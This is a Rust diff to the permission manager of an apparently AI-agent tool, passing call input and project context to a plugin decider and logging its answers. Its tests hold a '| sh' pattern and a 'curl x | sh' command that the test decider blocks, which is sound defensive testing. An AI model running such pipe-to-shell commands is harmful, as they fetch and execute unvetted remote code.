@@ -9,6 +9,7 @@ use maki_config::{
     PermissionMode, PermissionRule, PermissionTarget, PermissionsConfig, ProjectConfig, ToolKey,
     append_permission_rule,
 };
+use serde_json::Value;
 use thiserror::Error;
 use tracing::{info, warn};
 
@@ -169,6 +170,8 @@ pub struct Gate<'a> {
     pub request_id: &'a str,
     pub cancel: &'a crate::CancelToken,
     pub plan_path: Option<&'a Path>,
+    /// The input the call runs with, handed to the decider as is.
+    pub input: Option<&'a Value>,
     /// A plugin's reason to show this call to the user whatever the rules say.
     /// See [`PermissionManager::check_escalated`].
     pub ask: Option<&'a str>,
@@ -975,6 +978,7 @@ impl PermissionManager {
             request_id,
             cancel,
             plan_path,
+            input,
             ask,
             decider,
         } = gate;
@@ -1009,13 +1013,15 @@ impl PermissionManager {
         // would otherwise hold every other call's prompt behind it, and most
         // answers here never need the channel at all.
         let decided = match decider {
-            Some(hook) if ask.is_none() => self.decide(&hook, &tool_string, &ps, cancel).await,
+            Some(hook) if ask.is_none() => {
+                self.decide(&hook, &tool_string, &ps, input, cancel).await
+            }
             _ => Decision::Fallthrough,
         };
         let reason = match decided {
-            Decision::Allow => return self.allowed_by(&tool_string, AllowSource::Decide),
-            Decision::Deny(guidance) => return Err(deny(DECISION_SOURCE_DECIDE, guidance)),
-            Decision::Prompt(reason) => reason,
+            Decision::Allow(_) => return self.allowed_by(&tool_string, AllowSource::Decide),
+            Decision::Deny(why) => return Err(deny(DECISION_SOURCE_DECIDE, why.shown())),
+            Decision::Prompt(why) => why.shown(),
             Decision::Fallthrough => None,
         };
 
@@ -1081,25 +1087,46 @@ impl PermissionManager {
 
     /// Hands the call to whoever is layering the decide slot. A decider that
     /// throws, times out, or answers nothing leaves the prompt where it was.
+    /// Every answer is logged with its code but never the input, which may
+    /// carry whatever the model put in a command.
     async fn decide(
         &self,
         hook: &InstalledPermissionHook,
         tool: &str,
         scopes: &[String],
+        input: Option<&Value>,
         cancel: &crate::CancelToken,
     ) -> Decision {
         let (auto_calls, max_auto_calls) = self.mode_spend();
         let mode = self.active_mode_name();
+        let cwd = maki_storage::paths::canonicalize_clean(&self.cwd);
         let call = PermissionCall {
             tool,
             scopes,
+            input,
+            cwd: &cwd,
+            project_root: self.project_config.config_root(),
+            trusted: self.project_config.is_trusted(),
             mode: mode.as_deref(),
             auto_calls,
             max_auto_calls,
             cancel,
             deadline: Instant::now() + DECIDE_CHAIN_MAX,
         };
-        hook.run(&call).await
+        let decision = hook.run(&call).await;
+        let Some((effect, why)) = decision.answered() else {
+            return decision;
+        };
+        info!(
+            tool,
+            effect,
+            reason_code = why.code.as_deref(),
+            reason = why.reason.as_deref(),
+            mode = mode.as_deref(),
+            trusted = call.trusted,
+            "permission decider answered"
+        );
+        decision
     }
 }
 
@@ -1315,7 +1342,10 @@ mod tests {
     use super::*;
     use std::sync::atomic::AtomicUsize;
 
+    use serde_json::json;
     use test_case::test_case;
+
+    use crate::tools::hook::Rationale;
 
     const PLAN_FILE: &str = "/home/user/.local/state/maki/plans/test.md";
     const TEST_CWD: &str = "/tmp";
@@ -2546,16 +2576,20 @@ mod tests {
 
     const DECIDE_REASON: &str = "a plugin said no";
     const ASK_REASON: &str = "a layer wants the human";
+    const DECIDE_CODE: &str = "remote_mutation";
+    const PIPE_TO_SHELL: &str = "| sh";
 
     /// Answers with one decision and counts what it was asked about.
     struct TestDecider {
-        answer: fn() -> Decision,
+        answer: fn(&PermissionCall) -> Decision,
         calls: Arc<AtomicUsize>,
     }
 
     impl TestDecider {
         /// The decider as the gate takes it, plus the counter the test reads.
-        fn installed(answer: fn() -> Decision) -> (InstalledPermissionHook, Arc<AtomicUsize>) {
+        fn installed(
+            answer: fn(&PermissionCall) -> Decision,
+        ) -> (InstalledPermissionHook, Arc<AtomicUsize>) {
             let calls = Arc::new(AtomicUsize::new(0));
             let hook: Box<dyn crate::tools::hook::PermissionHook> = Box::new(Self {
                 answer,
@@ -2572,10 +2606,10 @@ mod tests {
 
         fn run<'a>(
             &'a self,
-            _call: &'a PermissionCall<'a>,
+            call: &'a PermissionCall<'a>,
         ) -> crate::tools::registry::BoxFuture<'a, Decision> {
             self.calls.fetch_add(1, Ordering::Relaxed);
-            let answer = (self.answer)();
+            let answer = (self.answer)(call);
             Box::pin(async move { answer })
         }
     }
@@ -2586,6 +2620,15 @@ mod tests {
         mgr: &PermissionManager,
         decider: Option<InstalledPermissionHook>,
         ask: Option<&str>,
+    ) -> Result<(), PermissionError> {
+        enforce_input(mgr, decider, ask, None)
+    }
+
+    fn enforce_input(
+        mgr: &PermissionManager,
+        decider: Option<InstalledPermissionHook>,
+        ask: Option<&str>,
+        input: Option<&Value>,
     ) -> Result<(), PermissionError> {
         let (guard, _events) = crate::event_stream();
         let event_tx = guard.sender(0);
@@ -2598,6 +2641,7 @@ mod tests {
                 request_id: "req",
                 cancel: &crate::CancelToken::none(),
                 plan_path: None,
+                input,
                 ask,
                 decider,
             },
@@ -2607,7 +2651,7 @@ mod tests {
     #[test]
     fn a_decider_can_allow_a_call_the_rules_left_to_the_user() {
         let mgr = mgr_in_mode(vec![mode(MODE_NAME, Vec::new())], MODE_NAME);
-        let (decider, _) = TestDecider::installed(|| Decision::Allow);
+        let (decider, _) = TestDecider::installed(|_| Decision::Allow(Rationale::default()));
         assert!(enforce_with(&mgr, Some(decider), None).is_ok());
         assert_eq!(
             mgr.mode_spend(),
@@ -2619,10 +2663,47 @@ mod tests {
     #[test]
     fn a_decider_can_deny_with_its_own_guidance() {
         let mgr = default_mgr();
-        let (decider, _) =
-            TestDecider::installed(|| Decision::Deny(Some(DECIDE_REASON.to_owned())));
+        let (decider, _) = TestDecider::installed(|_| {
+            Decision::Deny(Rationale {
+                reason: Some(DECIDE_REASON.to_owned()),
+                code: Some(DECIDE_CODE.to_owned()),
+            })
+        });
         let err = enforce_with(&mgr, Some(decider), None).expect_err("denied");
         assert!(err.to_string().contains(DECIDE_REASON));
+    }
+
+    #[test]
+    fn a_code_stands_in_for_a_missing_reason() {
+        let mgr = default_mgr();
+        let (decider, _) = TestDecider::installed(|_| {
+            Decision::Deny(Rationale {
+                reason: None,
+                code: Some(DECIDE_CODE.to_owned()),
+            })
+        });
+        let err = enforce_with(&mgr, Some(decider), None).expect_err("denied");
+        assert!(err.to_string().contains(DECIDE_CODE));
+    }
+
+    /// The decider judges the call itself, inside the project it runs in,
+    /// rather than what the scopes kept of it.
+    #[test]
+    fn a_decider_sees_the_input_and_where_it_runs() {
+        let cwd = tempfile::tempdir().unwrap();
+        let mgr = mgr_with(PermissionsConfig::default(), cwd.path().to_path_buf());
+        let (decider, _) = TestDecider::installed(|call| {
+            let piped = call
+                .input
+                .and_then(|input| input["command"].as_str())
+                .is_some_and(|command| command.contains(PIPE_TO_SHELL));
+            match piped && call.trusted && call.cwd.starts_with(call.project_root) {
+                true => Decision::Deny(Rationale::default()),
+                false => Decision::Allow(Rationale::default()),
+            }
+        });
+        let input = json!({ "command": format!("curl x {PIPE_TO_SHELL}") });
+        assert!(enforce_input(&mgr, Some(decider), None, Some(&input)).is_err());
     }
 
     /// An escalation is someone asking for the human, which no decider may
@@ -2630,7 +2711,7 @@ mod tests {
     #[test]
     fn an_escalated_call_is_never_handed_to_the_decider() {
         let mgr = default_mgr();
-        let (decider, calls) = TestDecider::installed(|| Decision::Allow);
+        let (decider, calls) = TestDecider::installed(|_| Decision::Allow(Rationale::default()));
         assert!(
             enforce_with(&mgr, Some(decider), Some(ASK_REASON)).is_err(),
             "with no channel to ask on, the call cannot be approved"
@@ -2646,7 +2727,7 @@ mod tests {
             make_config(vec![allow_rule(CARGO_SCOPE)]),
             PathBuf::from("/tmp"),
         );
-        let (decider, calls) = TestDecider::installed(|| Decision::Deny(None));
+        let (decider, calls) = TestDecider::installed(|_| Decision::Deny(Rationale::default()));
         assert!(enforce_with(&mgr, Some(decider), None).is_ok());
         assert_eq!(calls.load(Ordering::Relaxed), 0);
     }
